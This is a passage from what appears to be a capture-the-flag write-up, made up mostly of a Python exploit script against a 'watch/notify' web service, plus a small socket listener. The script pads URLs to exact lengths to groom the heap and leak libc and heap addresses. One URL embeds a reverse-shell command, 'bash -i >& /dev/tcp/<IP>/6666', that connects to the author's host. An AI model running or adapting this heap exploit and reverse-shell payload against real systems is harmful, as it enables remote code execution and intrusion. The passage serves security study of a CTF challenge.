</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Watch </span><span class="si">{</span><span class="n">kind</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;size&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;item&#34;</span><span class="p">:</span> <span class="n">item_map</span><span class="p">[</span><span class="n">kind</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;kind&#34;</span><span class="p">:</span> <span class="n">kind</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;url&#34;</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;secret&#34;</span><span class="p">:</span> <span class="s2">&#34;123&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;watch&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">transact_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">unwatch</span><span class="p">(</span><span class="n">kind</span><span class="p">,</span> <span class="n">session</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Unwatch </span><span class="si">{</span><span class="n">kind</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;kind&#34;</span><span class="p">:</span> <span class="n">kind</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;unwatch&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">transact_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">notify</span><span class="p">(</span><span class="n">kind</span><span class="p">,</span> <span class="n">session</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Notify </span><span class="si">{</span><span class="n">kind</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;size&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;item&#34;</span><span class="p">:</span> <span class="n">item_map</span><span class="p">[</span><span class="n">kind</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;kind&#34;</span><span class="p">:</span> <span class="n">kind</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;notify&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">transact_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Create 3 users</span>
</span></span><span class="line"><span class="cl"><span class="c1"># random_hex = os.urandom(5).hex()</span>
</span></span><span class="line"><span class="cl"><span class="n">random_hex</span> <span class="o">=</span> <span class="s1">&#39;d0bebc4a8f&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">s1</span> <span class="o">=</span> <span class="n">create_user</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;user1-</span><span class="si">{</span><span class="n">random_hex</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;user1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s2</span> <span class="o">=</span> <span class="n">create_user</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;user2-</span><span class="si">{</span><span class="n">random_hex</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;user2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s3</span> <span class="o">=</span> <span class="n">create_user</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;user3-</span><span class="si">{</span><span class="n">random_hex</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;user3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Clean up hooks db</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;unwatch...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">s2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">s3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;bomb&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;rum&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;anchor&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Watch gold</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Length need to be 0x4ff</span>
</span></span><span class="line"><span class="cl"><span class="n">gold_url_1</span> <span class="o">=</span> <span class="s1">&#39;http://18.143.50.149:4/?x=__/plugins___________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Length need to be 0x43f</span>
</span></span><span class="line"><span class="cl"><span class="n">gold_url_2</span> <span class="o">=</span> <span class="s1">&#39;http://18.143.50.149:4/?x=__/plugins___________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">gold_url_1</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">gold_url_1</span><span class="p">,</span> <span class="n">s2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">gold_url_2</span><span class="p">,</span> <span class="n">s3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Watch bomb</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Length need to be 0x7d7</span>
</span></span><span class="line"><span class="cl"><span class="n">bomb_url</span> <span class="o">=</span> <span class="s1">&#39;http://18.143.50.149:4/?x=__/plugins___________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;bomb&#34;</span><span class="p">,</span> <span class="n">bomb_url</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Watch rum</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Length need to be 0x7e8</span>
</span></span><span class="line"><span class="cl"><span class="n">rum_url</span> <span class="o">=</span> <span class="s1">&#39;http://18.143.50.149:4/?x=__/plugins____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;rum&#34;</span><span class="p">,</span> <span class="n">rum_url</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Watch anchor</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Length need to be 0x800</span>
</span></span><span class="line"><span class="cl"><span class="c1"># The position of `bash xxx` need to be exact with this position</span>
</span></span><span class="line"><span class="cl"><span class="n">anchor_url</span> <span class="o">=</span> <span class="s1">&#39;http://18.143.50.149:4/?x=__/plugins______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________bash -c &#34;bash -i &gt;&amp; /dev/tcp/18.143.50.149/6666 0&gt;&amp;1&#34;;________________________&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">watch</span><span class="p">(</span><span class="s2">&#34;anchor&#34;</span><span class="p">,</span> <span class="n">anchor_url</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Add some delay before continue...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Notify gold</span>
</span></span><span class="line"><span class="cl"><span class="n">notify</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Add some delay before continue...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Notify bomb</span>
</span></span><span class="line"><span class="cl"><span class="n">notify</span><span class="p">(</span><span class="s2">&#34;bomb&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Add some delay before continue...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Notify rum (This will leak main_arena+96)</span>
</span></span><span class="line"><span class="cl"><span class="n">notify</span><span class="p">(</span><span class="s2">&#34;rum&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Notify rum (This will leak heap)</span>
</span></span><span class="line"><span class="cl"><span class="n">notify</span><span class="p">(</span><span class="s2">&#34;anchor&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Clean up hooks db</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;unwatch...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">s2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;gold&#34;</span><span class="p">,</span> <span class="n">s3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;bomb&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;rum&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">unwatch</span><span class="p">(</span><span class="s2">&#34;anchor&#34;</span><span class="p">,</span> <span class="n">s1</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Essentially, what I did was:</p>
<ul>
<li>Create three accounts (<code>user1</code>, <code>user2</code>, <code>user3</code>)</li>
<li>Call <code>watch(kind1)</code> with <code>url</code> length <code>0x4ff</code> for <code>user1</code>.</li>
<li>Call <code>watch(kind1)</code> with <code>url</code> length <code>0x4ff</code> for <code>user2</code>.</li>
<li>Call <code>watch(kind1)</code> with <code>url</code> length <code>0x43f</code> for <code>user3</code>.</li>
<li>Call <code>watch(kind2)</code> with <code>url</code> length <code>0x7d7</code> for <code>user1</code>.</li>
<li>Call <code>watch(kind3)</code> with <code>url</code> length <code>0x7e8</code> for <code>user1</code>.
<ul>
<li>We will call <code>notify</code> on this later to get a <code>libc</code> leak.</li>
</ul>
</li>
<li>Call <code>watch(kind4)</code> with <code>url</code> length <code>0x800</code> for <code>user1</code>.
<ul>
<li>We will call <code>notify</code> on this later to get a <code>heap</code> leak.</li>
</ul>
</li>
<li>Call <code>notify(kind1)</code>.</li>
<li>Call <code>notify(kind2)</code>.</li>
<li>Call <code>notify(kind3)</code>.
<ul>
<li>Our listening server will be hit with our input <code>url</code> + <code>libc</code> leak.</li>
</ul>
</li>
<li>Call <code>notify(kind4)</code>.
<ul>
<li>Our listening server will be hit with our input <code>url</code> + <code>heap</code> leak.</li>
</ul>
</li>
</ul>
<p>And here is our buggy listening server code. <strong>You can&rsquo;t change</strong> this <code>server</code> code to get the leak with my previous script.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span><span class="lnt">97
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --- constants ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span>   <span class="c1"># local address IP (not external address IP)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># &#39;0.0.0.0&#39; or &#39;&#39; - conection on all NICs (Network Interface Card),</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># &#39;127.0.0.1&#39; or &#39;localhost&#39; - local conection only (can&#39;t connect from remote computer)</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># &#39;Local_IP&#39; - connection only on one NIC which has this IP</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">4</span> <span class="c1"># local port (not external port)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --- functions ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">handle_client</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;recv_data: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#request_string = data.decode(&#34;utf-8&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#conn.send(request_string.encode(&#34;utf-8&#34;))</span>
</span></span><span class="line"><span class="cl">            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">BrokenPipeError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] addr:&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="s1">&#39;Connection closed by client?&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] addr:&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="s1">&#39;Exception:&#39;</span><span class="p">,</span> <span class="n">ex</span><span class="p">,</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># --- main ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#all_threads = []         </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># --- create socket ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] create socket&#39;</span><span class="p">)</span>    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span> <span class="c1"># default value is (socket.AF_INET, socket.SOCK_STREAM) so you don&#39;t have to use it</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># --- options ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># solution for &#34;[Error 89] Address already in use&#34;. Use before bind()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># --- assign socket to local IP (local NIC) ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] bind:&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">))</span> <span class="c1"># one tuple (HOST, PORT), not two arguments</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># --- set size of queue ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] listen&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># number of clients waiting in queue for &#34;accept&#34;.</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># If queue is full then client can&#39;t connect.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># --- accept client ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># accept client and create new socket `conn` (with different port) for this client only</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># and server will can use `s` to accept other clients (if you will use threading)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] accept ... waiting&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span> <span class="c1"># socket, address</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] addr:&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">handle_client</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#all_threads.append(t)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">KeyboardInterrupt</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># --- close socket ---</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[DEBUG] close socket&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
